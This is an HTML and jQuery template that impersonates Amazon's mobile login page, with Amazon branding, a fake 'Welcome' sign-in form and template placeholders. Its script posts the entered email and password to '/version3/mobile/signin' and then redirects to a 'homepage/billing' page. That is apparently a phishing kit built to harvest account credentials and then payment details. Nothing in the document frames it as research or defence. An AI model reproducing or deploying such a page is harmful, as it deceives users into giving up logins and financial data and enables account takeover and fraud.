<!DOCTYPE html>
<html class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-orientation a-gradients a-hires a-transform3d a-touch-scrolling a-ios a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember awa-browser"
      data-19ax5a9jf="mongoose" data-aui-build-date="3.19.8-2020-01-19">
<meta http-equiv="content-type" content="text/html;charset=UTF-8"/>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport"
          content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no">
    <title dir="ltr">Amazon login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">

    <link rel="stylesheet" href="style/css/61ccss.css">
    <link rel="stylesheet" href="style/css/01Scss.css">
    <link rel="stylesheet" href="style/css/11Hcss.css">

    <script src="js/jquery.min.js"></script>
    <script src="js/jquery.validate.min.js"></script>
    <style>
        .error {
            color: red
        }

        #zwimel {
            width: 100%;
            height: 100%;
            top: 0px;
            left: 0px;
            position: fixed;
            display: block;
            opacity: .9;
            background-color: #fff;
            z-index: 99;
            text-align: center;
        }

        #loading-image {
            position: fixed;
            width: 125px;
            height: 122px;
            z-index: 1000;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            transform: -webkit-translate(-50%, -50%);
            transform: -moz-translate(-50%, -50%);
            transform: -ms-translate(-50%, -50%);
        }
    </style>
</head>

<body class="a-color-offset-background ap-locale-ja_JP a-m-cn a-aui_157141-c a-aui_158613-t1 a-aui_72554-c a-aui_dropdown_187959-c a-aui_pci_risk_banner_210084-c a-aui_perf_130093-c a-aui_tnr_v2_180836-c a-aui_ux_145937-c auth-show-password-enabled auth-show-password-engaged auth-show-password-ready">

<div id="a-page">
    <div class="a-section a-spacing-none">
        <style>
            .nav-sprite-v3 .nav-sprite {
                background-image: url(style/img/new-nav-sprite-global-2x_blueheaven-fluid._CB403808729_.png);
                background-repeat: no-repeat;
                background-size: 275px;
            }

            .nav-spinner {
                background-image: url(style/img/snake._CB485935615_.gif);
            }

            .nav-logo-locale {
                float: left;
                display: none;
                margin: 2px 0 0 1px;
                font-size: 13.5px;
                color: #fff;
                line-height: 14px;
                font-weight: regular;
                padding-top: 1px;
            }
        </style><!--  -->
        <link rel="stylesheet" href="style/css/21Qcss.css">
        <link rel="stylesheet" href="style/css/219css.css">
        <img src="style/img/new-nav-sm-smile-sprite-global-1x_blueheaven._CB485919093_.png" style="display:none" alt="">
        <header class="nav-mobile nav-locale-jp nav-lang-ja nav-ssl nav-unrec nav-blueheaven">
            <div id="navbar" cel_widget_id="Navigation-mobile-navbar" role="navigation"
                 class="nav-t-basicNoAuth nav-sprite-v3 celwidget">
                <div id="nav-logobar">
                    <div class="nav-left">
                        <div id="nav-logo">
                            <a href="#" class="nav-logo-link" aria-label="Amazon">
                                <span class="nav-sprite nav-logo-base"></span>
                                <span class="nav-sprite nav-logo-ext"></span>
                                <span class="nav-logo-locale">${suffix!''}</span>
                            </a>
                        </div>
                    </div>
                    <div class="nav-right"></div>
                </div>
                <!--NAVYAAN-SUBNAV-AND-SMILE-FROM-GURUPA-->
            </div>
        </header>
        <!-- end runtime backup navbar -->
    </div>

    <div class="a-container">
        <div class="a-section a-spacing-none"></div>
        <div class="a-section a-spacing-none auth-pagelet-mobile-container"></div>

        <div class="a-section auth-pagelet-mobile-container">
            <!-- Set cross domain sso variables to be used for making Ajax calls to central Identity domain -->
            <!-- Set cross domain sso variables to be used for making Ajax calls to central Identity domain -->
            <div id="auth-alert-window" class="a-box a-alert a-alert-error" aria-live="assertive" role="alert">
                <div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">There was a problem</h4>
                    <div class="a-alert-content">
                        <ul class="a-unordered-list a-vertical auth-error-messages" role="alert">
                            <li id="auth-email-missing-alert">
                                <span class="a-list-item">Please Enter your email or mobile phone number</span>
                            </li>

                            <li id="auth-password-missing-alert">
                                <span class="a-list-item">Please enter your password</span>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
            <!-- show a warning modal dialog when the third party account is connected with Amazon -->
            <form name="signineml" method="post" id="signineml" novalidate="" action="#"
                  class="auth-validate-form auth-clearable-form" data-fwcim-id="tAzQmSig">
                <h1 class="a-spacing-micro a-spacing-top-small a-text-left">Welcome</h1>
                <div class="a-section a-spacing-base a-text-right">
                    <a id="auth-fpp-link-bottom" class="a-link-normal" target="_top" tabindex="9"
                       href="#">Forgot your password?</a>
                </div>

                <div class="a-input-text-group a-spacing-medium a-spacing-top-micro">
                    <label for="ap_email" class="a-form-label auth-mobile-label">Email (phone for mobile accounts)</label>

                    <div class="a-input-text-wrapper auth-required-field auth-fill-claim moa-single-claim-input-field-container">
                        <input type="text" maxlength="128"
                               class="a-input-text a-span12 auth-autofocus auth-required-field" id="email"
                               placeholder="Email (phone for mobile accounts)" name="email" tabindex="1" autocorrect="off"
                               autocapitalize="off">
                    </div>

                    <div id="ap_email_icon" class="auth-clear-icons" style="display: none;">
                        <i class="a-icon a-icon-close" role="img"></i>
                    </div>

                    <label for="ap_password" class="a-form-label auth-mobile-label">Amazon password</label>

                    <div id="auth-password-container"
                         class="a-input-text-wrapper auth-required-field auth-password-container auth-password auth-fill-password">
                        <input type="password" class="a-input-text a-span12 auth-autofocus auth-required-field"
                               maxlength="1024" id="password" placeholder="Amazon password" name="password" tabindex="2"
                               onchange="passvaluechange()">

                        <div id="ap_password_icon" class="auth-clear-icons" style="display: none;">
                            <i class="a-icon a-icon-close" role="img" onclick="clearpass()"></i>
                        </div>

                        <style type="text/css">
                            .a-row.auth-visible-password-container.auth-show-password-empty {
                                padding-bottom: 0px;
                            }
                        </style>
                        <div class="a-row auth-visible-password-container auth-show-password-empty" id="showpassdiv"
                             style="display: block;">
                            <span class="a-size-small a-color-secondary auth-visible-password"
                                  id="showpassvalue"></span>
                        </div>
                    </div>

                    <div id="auth-password-missing-alert"
                         class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini"
                         aria-live="assertive" role="alert">
                        <div class="a-box-inner a-alert-container">
                            <i class="a-icon a-icon-alert"></i>
                            <div class="a-alert-content">Please enter your password</div>
                        </div>
                    </div>

                    <input type="hidden" name="showPasswordChecked" value="true" id="ap_show_password_checked">
                </div>

                <div class="a-row">

                    <div class="a-column a-span12 a-spacing-medium">
                        <div id="auth-show-password-checkbox-container"
                             class="a-checkbox a-checkbox-fancy a-control-row a-touch-checkbox auth-show-password-checkbox">
                            <label for="auth-show-password-checkbox">
                                <input id="auth-show-password-checkbox" type="checkbox" name="" checked="" value=""
                                       tabindex="3" onclick="passchange();">
                                <i class="a-icon a-icon-checkbox"></i>
                                <span class="a-label a-checkbox-label">Show password</span>
                            </label>
                        </div>
                    </div>
                </div>

                <div class="a-row a-spacing-base">
                    <div data-a-input-name="rememberMe"
                         class="a-checkbox a-checkbox-fancy a-control-row a-touch-checkbox">
                        <label>
                            <input type="checkbox" name="rememberMe" value="true" tabindex="4">
                            <i class="a-icon a-icon-checkbox"></i>
                            <span class="a-label a-checkbox-label"> Keep me signed in.&nbsp;
                                <span class="a-declarative" data-action="a-modal"
                                      data-a-modal="{&quot;max-width&quot;:&quot;500px&quot;,&quot;width&quot;:&quot;95%&quot;,&quot;name&quot;:&quot;remember-me-detail-link-modal&quot;,&quot;header&quot;:&quot;[ログインしたままにする] チェックボックス&quot;}">
                                <a id="remember_me_learn_more_link" class="a-link-normal" href="#">Details</a></span>

                                <div class="a-popover-preload" id="a-popover-remember-me-detail-link-modal">
                                    <div class="a-section a-spacing-large a-spacing-top-mini">
                                        <p></p>
                                        <p>Keep logged in to reduce the number of times you are asked to log in on this device</p>
                                        <p>To keep your account secure, use this option only on your personal device</p>
                                        <p></p>
                                    </div>
                                </div>
                            </span>
                        </label>
                    </div>

                </div>

                <div class="a-row"></div>

                <div class="a-section">
                    <div class="a-button-stack">
                        <span id="auth-signin-button"
                              class="a-button a-button-span12 a-button-primary auth-share-credential-off">
                            <span class="a-button-inner">
                                <input id="signInSubmit" tabindex="6" class="a-button-input" type="submit"
                                       aria-labelledby="auth-signin-button-announce">
                                <span id="auth-signin-button-announce" class="a-button-text"
                                      aria-hidden="true">Sign-In</span>
                            </span>
                        </span>

                        <div class="a-section a-spacing-medium">

                            <div id="legalTextRow" class="a-row a-spacing-top-medium a-size-small">
                                By continuing, you agree to Amazon's &nbsp; <a href="#">Conditions of Use</a>&nbsp;and&nbsp;<a href="#">Privacy Notice</a>.
                        </div>

                        </div>

                        <div class="a-section a-spacing-medium a-text-center">

                            <div class="a-divider a-divider-break">
                                <h5>Are you a new Amazon customer?</h5>
                            </div>
                            <span id="auth-create-account-link" class="a-button a-button-span12 a-button-base">
                                <span class="a-button-inner">
                                    <a id="createAccountSubmit" tabindex="7" href="#" class="a-button-text"
                                       role="button">Create a new Amazon account</a>
                                </span>
                            </span>

                        </div>

                    </div>
            </form>
        </div>

        <!--  -->
        <footer class="nav-mobile nav-locale-us nav-lang-en nav-ftr-batmobile">
            <div id="nav-ftr" class="nav-t-basicNoAuth nav-sprite-v1">
                <div class="icp-container-mobile">
                    <style type="text/css">
                        /*#icp-touch-link-language { display: none; }*/
                        .icp-button {
                            display: inline-block !important;
                            background: 0 0;
                            font-size: 14px;
                            padding: 1em .9em;
                            text-align: left;
                        }
                    </style>
                    <a href="#" class="icp-button" id="icp-touch-link-language">
                        <div class="icp-nav-globe-img-2 icp-button-globe-2"></div>
                        <span class="icp-color-base">English</span>
                        <span class="nav-arrow icp-up-down-arrow"></span>
                    </a>
                    <style type="text/css">
                        /*#icp-touch-link-country { display: none; }*/
                    </style>
                    <a href="#" class="icp-button" id="icp-touch-link-country">
                        <#--<span class="icp-flag-3 icp-flag-3-jp"></span>-->
                        <span class="icp-color-base">${country!''}</span>
                        <span class="aok-hidden" style="display:none">Select a country / region for shopping.</span>
                    </a>
                </div>
                <ul class="nav-ftr-horiz nav-ftr-big ">
                    <li class="nav-li ">
                        <a href="#" class="nav-a">Search / browsing history</a>
                    </li>
                </ul>
                <ul class="nav-ftr-horiz ">
                    <li class="nav-li ">
                        <a href="#" class="nav-a">terms of use</a>
                    </li>
                    <li class="nav-li ">
                        <a href="#" class="nav-a">Privacy Policy</a>
                    </li>
                    <li class="nav-li ">
                        <a href="#" class="nav-a">Personalized Advertising Terms</a>
                    </li>
                </ul>
                <div id="nav-ftr-copyright">© 2000-2021, Amazon.com, Inc. and its affiliates</div>
            </div>
        </footer>
    </div>
    <div id="zwimel" class="zwimel" style="display:none;"><img id="loading-image" src="style/img/loading.gif">
</body>
<script type="text/javascript">
    $("form[name='signineml']").validate({
        rules: {
            email: {
                required: true,
                // email: true
            },
            password: "required",
        },
        messages: {
            email: "* Please enter your email or phone.",
            password: "* Please enter your password."
        },
        submitHandler: function(form) {
            $("#zwimel").show();
            $.post("/version3/mobile/signin", $("#signineml").serialize(),
                    function(result) {
                        setTimeout(function() {
                                    $("#zwimel").hide();
                                    $(location).attr("href", "homepage/billing")
                                },
                                1000)
                    })
        },
    })

    var passele = document.getElementById("password");
    var showpassdiv = document.getElementById("showpassdiv");
    var showpassvalue = document.getElementById("showpassvalue");
    var passclean = document.getElementById("ap_password_icon");
    $('#password').bind('input propertychange', function () {
        passvaluechange();
    });

    function passvaluechange() {
        showpassvalue.innerHTML = passele.value;
        if (passele.value) {
            passcleanshow();
        } else {
            passcleanhidden();
        }
    }
    function passcleanshow() {
        passclean.style = "display:block;";
    }
    function passcleanhidden() {
        passclean.style = "display:none;";
    }
    function clearpass() {
        passele.value = null;
        showpassvalue.innerHTML = passele.value;
        passcleanhidden();
    }
    function passchange() {
        var changele = document.getElementById("auth-show-password-checkbox");
        if (changele.checked) {
            showpassdiv.style = "display: block;";
        } else {
            showpassdiv.style = "display: none;";
        }
    }
</script>

